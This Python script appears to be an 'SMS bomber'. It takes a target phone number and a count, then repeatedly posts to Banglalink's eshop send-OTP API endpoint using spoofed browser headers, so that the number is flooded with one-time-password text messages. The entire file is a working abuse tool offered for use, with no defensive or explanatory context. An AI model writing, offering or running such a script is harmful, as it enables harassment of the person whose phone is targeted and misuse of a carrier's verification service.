import requests
import os
import time
number=str(input("Enter Your Number : "))
ammount=int(input("Enter Your Ammount : "))
headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://eshop.banglalink.net',
    'Referer': 'https://eshop.banglalink.net/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

json_data = {
    'type': 'phone',
    'phone': number,
}

for saju in range(ammount):
    response = requests.post('https://eshop-api.banglalink.net/api/v1/customer/send-otp', headers=headers, json=json_data)
    print(str(saju+1)+"SMS SENT")